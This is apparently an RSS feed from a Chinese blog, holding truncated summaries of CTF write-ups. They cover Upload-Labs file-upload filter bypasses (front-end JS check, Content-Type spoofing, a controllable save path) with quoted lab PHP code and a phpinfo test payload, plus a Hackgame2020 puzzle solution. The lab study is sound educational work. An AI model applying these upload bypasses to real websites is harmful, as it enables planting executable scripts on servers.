&lt;p>​	(这题使用了windows环境)&lt;/p>
&lt;p>​	源码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ext_arr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;jpg&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;png&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;gif&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_ext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>],&lt;span style="color:#a6e22e">strrpos&lt;/span>($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>],&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">in_array&lt;/span>($file_ext,$ext_arr)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;save_path&amp;#39;&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">rand&lt;/span>(&lt;span style="color:#ae81ff">10&lt;/span>, &lt;span style="color:#ae81ff">99&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">date&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;YmdHis&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$file_ext;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file,$img_path)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;上传出错！&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了&lt;code>$_GET['save_path']&lt;/code>，本题提示也写道&lt;/p>
&lt;p>&lt;code>本pass上传路径可控！&lt;/code>，就是通过这个GET变量控制上传路径。&lt;/p>
&lt;p>​	这一关的突破方法需要有一些条件：php版本需要低于&lt;code>5.3.29&lt;/code>（我使用的是php版本5.3.17的本地靶机），另一个条件是&lt;code>magic_quotes_gpc&lt;/code>需要为关闭状态。&lt;code>magic_quotes_gpc&lt;/code>的作用官方文档写道：&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Warning&lt;/strong> 本特性已自 PHP 5.3.0 起&lt;em>废弃&lt;/em>并将自 PHP 5.4.0 起&lt;em>移除&lt;/em>。&lt;/p>
&lt;p>​ 为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &amp;rsquo; (单引号)、&amp;quot; (双引号)、\（反斜杠）和 NUL&amp;rsquo;s 被一个反斜杠自动转义。&lt;/p></description></item><item><title>Upload-Labs(二)</title><link>/posts/ctf/upload-labs2/</link><pubDate>Mon, 09 Nov 2020 20:12:27 +0000</pubDate><guid>/posts/ctf/upload-labs2/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>​	这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。&lt;/p>
&lt;pre tabindex="0">&lt;code>$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
 if (file_exists(UPLOAD_PATH)) {
 //这里下面是过滤
 $deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.html&amp;#34;, ......);
 $file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $file_name = deldot($file_name);//删除文件名末尾的点
 $file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
 $file_ext = strtolower($file_ext); //转换为小写
 $file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//去除字符串::$DATA
 $file_ext = trim($file_ext); //首尾去空

	//这里下面是移动文件。
 	if (!in_array($file_ext, $deny_ext)) {
 $temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
 $img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
 if (move_uploaded_file($temp_file, $img_path)) {
 $is_upload = true;
 } else {
 $msg = &amp;#39;上传出错！&amp;#39;;
 }
 } else {
 $msg = &amp;#39;此文件类型不允许上传！&amp;#39;;
 }
 
 } else {
 $msg = UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
 }
}
&lt;/code>&lt;/pre>&lt;p>过滤部分：&lt;/p></description></item><item><title>Upload-Labs(一)</title><link>/posts/ctf/upload-labs1/</link><pubDate>Sun, 08 Nov 2020 19:23:16 +0000</pubDate><guid>/posts/ctf/upload-labs1/</guid><description>&lt;h2 id="介绍">介绍&lt;/h2>
&lt;blockquote>
&lt;p>大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。&lt;/p>
&lt;/blockquote>
&lt;p>在线靶机地址：&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://buuoj.cn/challenges#Upload-Labs-Linux">linux环境&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://buuoj.cn/challenges#%5BWindows%5DUpload-Labs-Windows">windows环境&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="pass-01">Pass-01&lt;/h2>
&lt;p>​	尝试上传php木马，发现提示上传错误&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTKbfs.png" alt="">&lt;/p>
&lt;p>​	提示只能上传&lt;code>jpg、png、gif&lt;/code>类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。&lt;/p>
&lt;p>​	源码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">checkFile&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">getElementsByName&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>].&lt;span style="color:#a6e22e">value&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;请选择要上传的文件!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//定义允许上传的文件类型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">allow_ext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;.jpg|.png|.gif&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//提取上传文件的类型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">ext_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span>.&lt;span style="color:#a6e22e">substring&lt;/span>(&lt;span style="color:#a6e22e">file&lt;/span>.&lt;span style="color:#a6e22e">lastIndexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//判断上传文件类型是否允许上传
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">allow_ext&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">ext_name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;|&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">errMsg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;该文件不允许上传，请上传&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">allow_ext&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;类型的文件,当前文件类型为：&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">ext_name&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#a6e22e">errMsg&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	把文件后缀名改成jpg格式上传，使用&lt;strong>burp suit&lt;/strong>抓包。把&lt;code>.jpg&lt;/code>后缀重新改为&lt;code>.php&lt;/code>即可实现绕过前端JS代码。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTM5g1.png" alt="">&lt;/p>
&lt;p>​	然后右键打开图片，代码成功执行。完工&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTQV8s.png" alt="">&lt;/p>
&lt;p>​	注：后面题目的php代码都使用&lt;code>2333.php&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#66d9ef">eval&lt;/span>(&lt;span style="color:#a6e22e">phpinfo&lt;/span>());
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	执行结果是打印出php版本信息。&lt;/p>
&lt;h2 id="pass-02">Pass-02&lt;/h2>
&lt;p>​	源码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">file_exists&lt;/span>(&lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/jpeg&amp;#39;&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> ($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/png&amp;#39;&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> ($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/gif&amp;#39;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>] 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file, $img_path)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;上传出错！&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;文件类型不正确，请重新上传！&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;文件夹不存在,请手工创建！&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	发现文件判断是根据&lt;code>image/jpeg、image/png...&lt;/code>进行过滤判定，这些值都是Http请求中的&lt;strong>Content-Type&lt;/strong>常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:&lt;a href="https://www.cnblogs.com/klb561/p/10090540.html">Http请求中Content-Type&lt;/a>。&lt;/p></description></item><item><title>Hackgame2020(二)</title><link>/posts/ctf/hackgame20202/</link><pubDate>Thu, 05 Nov 2020 09:29:22 +0000</pubDate><guid>/posts/ctf/hackgame20202/</guid><description>&lt;h3 id="一闪而过的flag">一闪而过的Flag&lt;/h3>
&lt;p>​	根据题目信息&lt;strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过&lt;/strong>，我想到了应该能看程序的代码啥的找到，但是&lt;del>天下武功，唯快不破&lt;/del>，下载 运行 截图一气呵成。&lt;/p>
&lt;p>​	&lt;img src="https://s1.ax1x.com/2020/11/09/B7TOUA.png" alt="">&lt;/p>
&lt;p>​	接下来让我康康哪一位是&lt;del>瞎子&lt;/del>，包括答案里也是满满的嘲讽。&lt;/p>
&lt;p>&lt;strong>参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}&lt;/strong>&lt;/p>
&lt;h3 id="从零开始的记账工具人">从零开始的记账工具人&lt;/h3>
&lt;p>​	&lt;del>npy&lt;/del>给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/05/B2Flxf.png" alt="">&lt;/p>
&lt;p>​	原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.util.Scanner;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Main&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Scanner sn &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Scanner(System.&lt;span style="color:#a6e22e">in&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String str;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> x;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> cnt&lt;span style="color:#f92672">=&lt;/span>0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> result&lt;span style="color:#f92672">=&lt;/span>0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(cnt&lt;span style="color:#f92672">++!=&lt;/span>1000){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> str &lt;span style="color:#f92672">=&lt;/span> sn.&lt;span style="color:#a6e22e">next&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> sn.&lt;span style="color:#a6e22e">nextInt&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">+=&lt;/span> tonum(str)&lt;span style="color:#f92672">*&lt;/span>x;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">double&lt;/span> &lt;span style="color:#a6e22e">tonum&lt;/span>(String s){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> res&lt;span style="color:#f92672">=&lt;/span>0,temp &lt;span style="color:#f92672">=&lt;/span> 1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> result&lt;span style="color:#f92672">=&lt;/span>0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> s.&lt;span style="color:#a6e22e">length&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> i&lt;span style="color:#f92672">=&lt;/span>0;i&lt;span style="color:#f92672">&amp;lt;&lt;/span>len;i&lt;span style="color:#f92672">++&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (s.&lt;span style="color:#a6e22e">charAt&lt;/span>(i)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;壹&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>1;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;贰&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>2;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;叁&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>3;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;肆&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>4;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;伍&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>5;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;陆&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>6;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;柒&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>7;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;捌&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>8;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;玖&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>9;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;零&amp;#39;&lt;/span>: &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;拾&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>10;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;佰&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>100;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
